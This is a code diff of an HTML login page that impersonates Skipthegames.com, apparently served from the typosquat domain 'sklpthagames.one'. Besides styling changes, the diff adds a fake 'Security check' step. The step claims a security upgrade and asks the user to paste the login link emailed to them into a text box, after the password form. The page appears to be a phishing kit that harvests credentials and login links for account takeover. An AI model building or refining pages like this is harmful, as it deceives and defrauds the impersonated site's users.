@@ -9,20 +9,26 @@
   <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
   <!-- You can update the version number in the CDN link as needed -->
   <link rel="stylesheet" href="style.css" />
+  <style>
+    .shadow-inner-custom {
+      box-shadow: inset 0 -15px 15px -15px rgba(0, 0, 0, .4), inset 0 15px 15px -15px rgba(0, 0, 0, .4);
+      --tw-shadow-colored: inset 0 -15px 15px -15px var(--tw-shadow-color), inset 0 15px 15px -15px var(--tw-shadow-color);
+    }
+  </style>
 </head>
 
+
 <body>
-  <nav>
+  <header>
     <div class="cc-cookies">
       <b>We use cookies, just to track visits to our website, we store no
         personal details.</b>
       <a href="" class="cc-cookie-accept">ACCEPT COOKIES</a>
       <a href="#" title="Review our cookie policy"><b>What are cookies?</b></a>
     </div>
-  </nav>
-
-  <main class="mx-5">
-    <div class="row sm:flex gap-10 items-center py-10" id="top">
+  </header>
+  <nav class="shadow-lg shadow-black">
+    <div class="row sm:flex gap-10 items-center py-5" id="top">
       <div class="">
         <h1 title="Adult dating and casual encounters">
           <a href="https://sklpthagames.one/">
@@ -37,13 +43,27 @@
         </h5>
       </div>
     </div>
+  </nav>
+  <div class=" py-6 lg:py-[18px] px-4 lg:px-0  text-[11px] shadow-inner-custom">
+    <div class="container mx-auto flex items-center gap-2">
+      <p class="">SKIPTHEGAMES.COM</p><span class="text-[#C9DEEB]">»</span>
+      <p class=" text-[#C9DEEB]">LOGIN</p>
+    </div>
+  </div>
+
+  <main class="mx-5 my-10">
+
 
     <!-- form area -->
     <div class="row sm:flex gap-28">
       <!-- left side -->
       <div>
+
         <div id="loginSystem">
-          <div class="login-form">
+
+
+
+          <div class="login-form shadow-lg shadow-black">
             <h3>Log in to your account</h3>
             <form class="flex flex-col gap-5">
               <p class="error">
@@ -58,14 +78,14 @@
                   password</small>
               </p>
 
-              <input type="submit" name="submit" value="Log in" class="rounded sky p-2.5 text-white" />
-              <p class="m0 ull" style="font-weight: bold; color: red">
+              <input  type="submit" name="submit" value="Log in" class="rounded sky p-2.5 text-white" />
+              <p class=" ull" style="font-weight: bold; color: red">
                 Password not working?
-                <a href="#" class="purpal underline">Click here</a>
+                <a href="#" class="">Click here</a>
               </p>
               <p>
                 <small>By clicking "Log in", you accept
-                  <a href="#" class="purpal">Skipthegames.com's Terms and Conditions of Use</a></small>
+                  <a href="#" class="">Skipthegames.com's Terms and Conditions of Use</a></small>
               </p>
             </form>
             <p class="py-5">
@@ -74,6 +94,42 @@
                 <a href="" class="purpal">Terms of Service</a>
                 apply.</small>
             </p>
+          </div>
+        </div>
+
+        <div id="otpSystem">
+          <div class="pt-[14px] lg:pt-[18px] py-[38px] ">
+            <h1 class="text-2xl">Security check</h1>
+            <div class="mt-3 space-y-6">
+              <p class="">We have upgraded our security to protect all users against account takeovers and hacking.</p>
+              <p class="">To complete this login, an Email has been sent to your address doxuky@mailinator.com. <span
+                  class="text-xs text-custom- underline">I don't have access to this email account</span></p>
+              <p class="">Please enter this email link:</p>
+              <div class="">
+                <form class="flex gap-5">
+                  <div class="flex">
+                    <input style="width: 600px;" name="" class="p-2 border  border-gray-300"
+                      placeholder="Please copy and then paste this link into a from (a bar) on a web page:" type="text"
+                      required>
+                    <input type="submit" class="rounded bg-sky-900 p-2.5 text-white" value="submit"
+                    style="text-align: center;
+              color: white;
+              background: skyblue;
+              border-radius: 2px;"
+                    />
+                    </div>
+
+                </form>
+              </div>
+              <p class="">The email you received is good for 30 minutes.</p>
+              <p class="">It may take the code up to 10 minutes to arrive. Make sure to check your Spam/Junk/Trash
+                folder.</p>
+              <div class="flex gap-9 text-custom-rose">
+                <p class="cursor-pointer hover:text-custom-rose2 underline">Resend the code</p>
+                <p class="cursor-pointer hover:text-custom-rose2 underline">I don't have access to this email account
+                </p>
+              </div>
+            </div>
           </div>
         </div>
 
